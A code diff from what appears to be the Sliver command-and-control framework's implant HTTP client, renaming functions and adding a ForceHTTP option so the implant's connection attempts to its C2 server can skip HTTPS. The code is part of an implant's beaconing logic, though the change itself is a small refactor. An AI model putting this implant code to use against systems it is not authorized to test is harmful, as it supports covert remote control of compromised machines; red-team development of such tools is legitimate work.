@@ -121,7 +121,7 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
-	g := NewSliverHTTPClientGenerator(address, pathPrefix, opts)
+	g := newSliverHTTPClientGenerator(address, pathPrefix, opts)
 
 	for ok := g.Next(); ok; ok = g.Next() {
 		client := g.Value()
@@ -147,19 +147,19 @@ type SliverHTTPClientGenerator struct {
 
 	value *SliverHTTPClient
 
-	Strategies []SliverHTTPClientGenerationStrategy
+	strategies []SliverHTTPClientGenerationStrategy
 }
 
-func NewSliverHTTPClientGenerator(address string, pathPrefix string, opts *HTTPOptions) *SliverHTTPClientGenerator {
+func newSliverHTTPClientGenerator(address string, pathPrefix string, opts *HTTPOptions) *SliverHTTPClientGenerator {
 	g := &SliverHTTPClientGenerator{
 		Address:    address,
 		PathPrefix: pathPrefix,
 		Opts:       opts,
 	}
 
-	g.Strategies = make([]SliverHTTPClientGenerationStrategy, 0)
-	for _, secure := range []bool{false, true} {
-		g.Strategies = append(g.Strategies, SliverHTTPClientGenerationStrategy{
+	g.strategies = make([]SliverHTTPClientGenerationStrategy, 0)
+	for _, secure := range getHTTPClientSecureOptions(opts) {
+		g.strategies = append(g.strategies, SliverHTTPClientGenerationStrategy{
 			Secure: secure,
 		})
 	}
@@ -167,12 +167,20 @@ func NewSliverHTTPClientGenerator(address string, pathPrefix string, opts *HTTPO
 	return g
 }
 
-func (g *SliverHTTPClientGenerator) Next() bool {
-	for n := len(g.Strategies); n > 0; n = len(g.Strategies) {
-		var currentStrategy SliverHTTPClientGenerationStrategy
-		currentStrategy, g.Strategies = g.Strategies[n-1], g.Strategies[:n-1]
+func getHTTPClientSecureOptions(opts *HTTPOptions) []bool {
+	if opts.ForceHTTP {
+		return []bool{false}
+	}
 
-		origin := g.GetOrigin(currentStrategy.Secure)
+	return []bool{false, true}
+}
+
+func (g *SliverHTTPClientGenerator) Next() bool {
+	for n := len(g.strategies); n > 0; n = len(g.strategies) {
+		var currentStrategy SliverHTTPClientGenerationStrategy
+		currentStrategy, g.strategies = g.strategies[n-1], g.strategies[:n-1]
+
+		origin := g.getOrigin(currentStrategy.Secure)
 		driver, err := GetHTTPDriver(origin, currentStrategy.Secure, g.Opts)
 		if err != nil {
 			// {{if .Config.Debug}}
@@ -200,7 +208,7 @@ func (g *SliverHTTPClientGenerator) Value() *SliverHTTPClient {
 
 }
 
-func (g *SliverHTTPClientGenerator) GetOrigin(secure bool) string {
+func (g *SliverHTTPClientGenerator) getOrigin(secure bool) string {
 	address := g.Address
 
 	if !secure && strings.HasSuffix(address, ":443") {
